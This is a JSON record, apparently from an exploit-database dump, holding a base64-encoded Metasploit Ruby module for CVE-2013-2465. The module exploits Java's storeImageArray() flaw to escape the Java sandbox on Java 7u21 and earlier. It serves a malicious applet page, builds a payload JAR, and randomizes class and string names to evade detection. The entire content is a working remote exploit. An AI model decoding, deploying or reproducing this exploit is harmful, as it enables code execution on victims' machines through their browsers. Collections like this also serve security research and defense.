{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBmaWxlIGlzIHBhcnQgb2YgdGhlIE1ldGFzcGxvaXQgRnJhbWV3b3JrIGFuZCBtYXkgYmUgc3ViamVjdCB0bw0KIyByZWRpc3RyaWJ1dGlvbiBhbmQgY29tbWVyY2lhbCByZXN0cmljdGlvbnMuIFBsZWFzZSBzZWUgdGhlIE1ldGFzcGxvaXQNCiMgd2ViIHNpdGUgZm9yIG1vcmUgaW5mb3JtYXRpb24gb24gbGljZW5zaW5nIGFuZCB0ZXJtcyBvZiB1c2UuDQojICAgaHR0cDovL21ldGFzcGxvaXQuY29tLw0KIyMNCg0KcmVxdWlyZSAnbXNmL2NvcmUnDQpyZXF1aXJlICdyZXgnDQoNCmNsYXNzIE1ldGFzcGxvaXQzIDwgTXNmOjpFeHBsb2l0OjpSZW1vdGUNCiAgUmFuayA9IEdyZWF0UmFua2luZyAjIEJlY2F1c2UgdGhlcmUgaXNuJ3QgY2xpY2sycGxheSBieXBhc3MsIHBsdXMgbm93IEphdmEgU2VjdXJpdHkgTGV2ZWwgSGlnaCBieSBkZWZhdWx0DQoNCiAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OlJlbW90ZTo6SHR0cFNlcnZlcjo6SFRNTA0KDQogIGluY2x1ZGUgTXNmOjpFeHBsb2l0OjpSZW1vdGU6OkJyb3dzZXJBdXRvcHduDQogIGF1dG9wd25faW5mbyh7IDpqYXZhc2NyaXB0ID0+IGZhbHNlIH0pDQoNCiAgZGVmIGluaXRpYWxpemUoIGluZm8gPSB7fSApDQogICAgc3VwZXIoIHVwZGF0ZV9pbmZvKCBpbmZvLA0KICAgICAgJ05hbWUnICAgICAgICAgID0+ICdKYXZhIHN0b3JlSW1hZ2VBcnJheSgpIEludmFsaWQgQXJyYXkgSW5kZXhpbmcgVnVsbmVyYWJpbGl0eScsDQogICAgICAnRGVzY3JpcHRpb24nICAgPT4gJXF7DQogICAgICAgIFRoaXMgbW9kdWxlIGFidXNlcyBhbiBJbnZhbGlkIEFycmF5IEluZGV4aW5nIFZ1bG5lcmFiaWxpdHkgb24gdGhlDQogICAgICAgIHN0YXRpYyBmdW5jdGlvbiBzdG9yZUltYWdlQXJyYXkoKSBmdW5jdGlvbiBpbiBvcmRlciB0byBwcm9kdWNlIGENCiAgICAgICAgbWVtb3J5IGNvcnJ1cHRpb24gYW5kIGZpbmFsbHkgZXNjYXBlIHRoZSBKYXZhIFNhbmRib3guIFRoZSB2dWxuZXJhYmlsaXR5DQogICAgICAgIGFmZmVjdHMgSmF2YSB2ZXJzaW9uIDd1MjEgYW5kIGVhcmxpZXIuIFRoZSBtb2R1bGUsIHdoaWNoIGRvZXNuJ3QgYnlwYXNzDQogICAgICAgIGNsaWNrMnBsYXksIGhhcyBiZWVuIHRlc3RlZCBzdWNjZXNzZnVsbHkgb24gSmF2YSA3dTIxIG9uIFdpbmRvd3MgYW5kDQogICAgICAgIExpbnV4IHN5c3RlbXMuDQogICAgICB9LA0KICAgICAgJ0xpY2Vuc2UnICAgICAgID0+IE1TRl9MSUNFTlNFLA0KICAgICAgJ0F1dGhvcicgICAgICAgID0+DQogICAgICAgIFsNCiAgICAgICAgICAnVW5rbm93bicsICAjIEZyb20gUGFja2V0U3Rvcm0NCiAgICAgICAgICAnc2lubjNyJywgIyBNZXRhc3Bsb2l0DQogICAgICAgICAgJ2p1YW4gdmF6cXVleicgIyBNZXRhc3Bsb2l0DQogICAgICAgIF0sDQogICAgICAnUmVmZXJlbmNlcycgICAgPT4NCiAgICAgICAgWw0KICAgICAgICAgIFsgJ0NWRScsICcyMDEzLTI0NjUnIF0sDQogICAgICAgICAgWyAnT1NWREInLCAnOTYyNjknIF0sDQogICAgICAgICAgWyAnRURCJywgJzI3NTI2JyBdLA0KICAgICAgICAgIFsgJ1VSTCcsICdodHRwOi8vcGFja2V0c3Rvcm1zZWN1cml0eS5jb20vZmlsZXMvMTIyNzc3LycgXSwNCiAgICAgICAgICBbICdVUkwnLCAnaHR0cDovL2hnLm9wZW5qZGsuamF2YS5uZXQvamRrN3UvamRrN3UtZGV2L2pkay9yZXYvMmE5Yzc5ZGIwMDQwJyBdDQogICAgICAgIF0sDQogICAgICAnUGxhdGZvcm0nICAgICAgPT4gWyAnamF2YScsICd3aW4nLCAnbGludXgnIF0sDQogICAgICAnUGF5bG9hZCcgICAgICAgPT4geyAnU3BhY2UnID0+IDIwNDgwLCAnQmFkQ2hhcnMnID0+ICcnLCAnRGlzYWJsZU5vcHMnID0+IHRydWUgfSwNCiAgICAgICdUYXJnZXRzJyAgICAgICA9Pg0KICAgICAgICBbDQogICAgICAgICAgWyAnR2VuZXJpYyAoSmF2YSBQYXlsb2FkKScsDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICdBcmNoJyAgICAgPT4gQVJDSF9KQVZBLA0KICAgICAgICAgICAgICAnUGxhdGZvcm0nID0+ICdqYXZhJw0KICAgICAgICAgICAgfQ0KICAgICAgICAgIF0sDQogICAgICAgICAgWyAnV2luZG93cyBVbml2ZXJzYWwnLA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAnQXJjaCcgICAgID0+IEFSQ0hfWDg2LA0KICAgICAgICAgICAgICAnUGxhdGZvcm0nID0+ICd3aW4nDQogICAgICAgICAgICB9DQogICAgICAgICAgXSwNCiAgICAgICAgICBbICdMaW51eCB4ODYnLA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAnQXJjaCcgICAgID0+IEFSQ0hfWDg2LA0KICAgICAgICAgICAgICAnUGxhdGZvcm0nID0+ICdsaW51eCcNCiAgICAgICAgICAgIH0NCiAgICAgICAgICBdDQogICAgICAgIF0sDQogICAgICAnRGVmYXVsdFRhcmdldCcgID0+IDAsDQogICAgICAnRGlzY2xvc3VyZURhdGUnID0+ICdBdWcgMTIgMjAxMycNCiAgICAgICkpDQogIGVuZA0KDQogIGRlZiBzZXR1cA0KICAgIHBhdGggPSBGaWxlLmpvaW4oTXNmOjpDb25maWcuaW5zdGFsbF9yb290LCAiZGF0YSIsICJleHBsb2l0cyIsICJDVkUtMjAxMy0yNDY1IiwgIkV4cGxvaXQuY2xhc3MiKQ0KICAgIEBleHBsb2l0X2NsYXNzID0gRmlsZS5vcGVuKHBhdGgsICJyYiIpIHt8ZmR8IGZkLnJlYWQoZmQuc3RhdC5zaXplKSB9DQogICAgcGF0aCA9IEZpbGUuam9pbihNc2Y6OkNvbmZpZy5pbnN0YWxsX3Jvb3QsICJkYXRhIiwgImV4cGxvaXRzIiwgIkNWRS0yMDEzLTI0NjUiLCAiRXhwbG9pdCRNeUNvbG9yTW9kZWwuY2xhc3MiKQ0KICAgIEBjb2xvcl9tb2RlbF9jbGFzcyA9IEZpbGUub3BlbihwYXRoLCAicmIiKSB7fGZkfCBmZC5yZWFkKGZkLnN0YXQuc2l6ZSkgfQ0KICAgIHBhdGggPSBGaWxlLmpvaW4oTXNmOjpDb25maWcuaW5zdGFsbF9yb290LCAiZGF0YSIsICJleHBsb2l0cyIsICJDVkUtMjAxMy0yNDY1IiwgIkV4cGxvaXQkTXlDb2xvclNwYWNlLmNsYXNzIikNCiAgICBAY29sb3Jfc3BhY2VfY2xhc3MgPSBGaWxlLm9wZW4ocGF0aCwgInJiIikge3xmZHwgZmQucmVhZChmZC5zdGF0LnNpemUpIH0NCg0KICAgIEBleHBsb2l0X2NsYXNzX25hbWUgPSByYW5kX3RleHRfYWxwaGEoIkV4cGxvaXQiLmxlbmd0aCkNCiAgICBAY29sb3JfbW9kZWxfY2xhc3NfbmFtZSA9IHJhbmRfdGV4dF9hbHBoYSgiTXlDb2xvck1vZGVsIi5sZW5ndGgpDQogICAgQGNvbG9yX3NwYWNlX2NsYXNzX25hbWUgPSByYW5kX3RleHRfYWxwaGEoIk15Q29sb3JTcGFjZSIubGVuZ3RoKQ0KDQogICAgQGV4cGxvaXRfY2xhc3MuZ3N1YiEoIkV4cGxvaXQiLCBAZXhwbG9pdF9jbGFzc19uYW1lKQ0KICAgIEBleHBsb2l0X2NsYXNzLmdzdWIhKCJNeUNvbG9yTW9kZWwiLCBAY29sb3JfbW9kZWxfY2xhc3NfbmFtZSkNCiAgICBAZXhwbG9pdF9jbGFzcy5nc3ViISgiTXlDb2xvclNwYWNlIiwgQGNvbG9yX3NwYWNlX2NsYXNzX25hbWUpDQoNCiAgICBAY29sb3JfbW9kZWxfY2xhc3MuZ3N1YiEoIkV4cGxvaXQiLCBAZXhwbG9pdF9jbGFzc19uYW1lKQ0KICAgIEBjb2xvcl9tb2RlbF9jbGFzcy5nc3ViISgiTXlDb2xvck1vZGVsIiwgQGNvbG9yX21vZGVsX2NsYXNzX25hbWUpDQogICAgQGNvbG9yX21vZGVsX2NsYXNzLmdzdWIhKCJNeUNvbG9yU3BhY2UiLCBAY29sb3Jfc3BhY2VfY2xhc3NfbmFtZSkNCg0KDQogICAgQGNvbG9yX3NwYWNlX2NsYXNzLmdzdWIhKCJFeHBsb2l0IiwgQGV4cGxvaXRfY2xhc3NfbmFtZSkNCiAgICBAY29sb3Jfc3BhY2VfY2xhc3MuZ3N1YiEoIk15Q29sb3JNb2RlbCIsIEBjb2xvcl9tb2RlbF9jbGFzc19uYW1lKQ0KICAgIEBjb2xvcl9zcGFjZV9jbGFzcy5nc3ViISgiTXlDb2xvclNwYWNlIiwgQGNvbG9yX3NwYWNlX2NsYXNzX25hbWUpDQoNCiAgICBzdXBlcg0KICBlbmQNCg0KICBkZWYgb25fcmVxdWVzdF91cmkoIGNsaSwgcmVxdWVzdCApDQogICAgcHJpbnRfZGVidWcoIlJlcXVlc3Rpbmc6ICN7cmVxdWVzdC51cml9IikNCiAgICBpZiByZXF1ZXN0LnVyaSAhfiAvXC5qYXIkL2kNCiAgICAgIGlmIG5vdCByZXF1ZXN0LnVyaSA9fiAvXC8kLw0KICAgICAgICBwcmludF9zdGF0dXMoIlNlbmRpbmcgcmVkaXJlY3QuLi4iKQ0KICAgICAgICBzZW5kX3JlZGlyZWN0KGNsaSwgIiN7Z2V0X3Jlc291cmNlfS8iLCAnJykNCiAgICAgICAgcmV0dXJuDQogICAgICBlbmQNCg0KICAgICAgcHJpbnRfc3RhdHVzKCJTZW5kaW5nIEhUTUwuLi4iKQ0KICAgICAgc2VuZF9yZXNwb25zZV9odG1sKGNsaSwgZ2VuZXJhdGVfaHRtbCwgeydDb250ZW50LVR5cGUnPT4ndGV4dC9odG1sJ30pDQogICAgICByZXR1cm4NCiAgICBlbmQNCg0KICAgIHByaW50X3N0YXR1cygiU2VuZGluZyAuamFyIGZpbGUuLi4iKQ0KICAgIHNlbmRfcmVzcG9uc2UoY2xpLCBnZW5lcmF0ZV9qYXIoY2xpKSwgeydDb250ZW50LVR5cGUnPT4nYXBwbGljYXRpb24vamF2YS1hcmNoaXZlJ30pDQoNCiAgICBoYW5kbGVyKCBjbGkgKQ0KICBlbmQNCg0KICBkZWYgZ2VuZXJhdGVfaHRtbA0KICAgIGphcl9uYW1lID0gcmFuZF90ZXh0X2FscGhhKDUrcmFuZCgzKSkNCiAgICBodG1sID0gJVF8PGh0bWw+DQogICAgPGhlYWQ+DQogICAgPC9oZWFkPg0KICAgIDxib2R5Pg0KICAgIDxhcHBsZXQgYXJjaGl2ZT0iI3tqYXJfbmFtZX0uamFyIiBjb2RlPSIje0BleHBsb2l0X2NsYXNzX25hbWV9IiB3aWR0aD0iMTAwMCIgaGVpZ2h0PSIxMDAwIj4NCiAgICA8L2FwcGxldD4NCiAgICA8L2JvZHk+DQogICAgPC9odG1sPg0KICAgIHwNCiAgICBodG1sID0gaHRtbC5nc3ViKC9eXHRcdC8sICcnKQ0KICAgIHJldHVybiBodG1sDQogIGVuZA0KDQogIGRlZiBnZW5lcmF0ZV9qYXIoY2xpKQ0KDQogICAgcCA9IHJlZ2VuZXJhdGVfcGF5bG9hZChjbGkpDQogICAgamFyICA9IHAuZW5jb2RlZF9qYXINCg0KICAgIGphci5hZGRfZmlsZSgiI3tAZXhwbG9pdF9jbGFzc19uYW1lfS5jbGFzcyIsIEBleHBsb2l0X2NsYXNzKQ0KICAgIGphci5hZGRfZmlsZSgiI3tAZXhwbG9pdF9jbGFzc19uYW1lfSQje0Bjb2xvcl9tb2RlbF9jbGFzc19uYW1lfS5jbGFzcyIsIEBjb2xvcl9tb2RlbF9jbGFzcykNCiAgICBqYXIuYWRkX2ZpbGUoIiN7QGV4cGxvaXRfY2xhc3NfbmFtZX0kI3tAY29sb3Jfc3BhY2VfY2xhc3NfbmFtZX0uY2xhc3MiLCBAY29sb3Jfc3BhY2VfY2xhc3MpDQogICAgbWV0YXNwbG9pdF9zdHIgPSByYW5kX3RleHRfYWxwaGEoIm1ldGFzcGxvaXQiLmxlbmd0aCkNCiAgICBwYXlsb2FkX3N0ciA9IHJhbmRfdGV4dF9hbHBoYSgicGF5bG9hZCIubGVuZ3RoKQ0KICAgIGphci5lbnRyaWVzLmVhY2ggeyB8ZW50cnl8DQogICAgICBlbnRyeS5uYW1lLmdzdWIhKCJtZXRhc3Bsb2l0IiwgbWV0YXNwbG9pdF9zdHIpDQogICAgICBlbnRyeS5uYW1lLmdzdWIhKCJQYXlsb2FkIiwgcGF5bG9hZF9zdHIpDQogICAgICBlbnRyeS5kYXRhID0gZW50cnkuZGF0YS5nc3ViKCJtZXRhc3Bsb2l0IiwgbWV0YXNwbG9pdF9zdHIpDQogICAgICBlbnRyeS5kYXRhID0gZW50cnkuZGF0YS5nc3ViKCJQYXlsb2FkIiwgcGF5bG9hZF9zdHIpDQogICAgfQ0KICAgIGphci5idWlsZF9tYW5pZmVzdA0KDQogICAgcmV0dXJuIGphci5wYWNrDQogIGVuZA0KDQplbmQ=", 
    "filename": "platforms/multiple/remote/27705.rb", 
    "id": "27705", 
    "cves": [
        "CVE-2013-2465"
    ]
}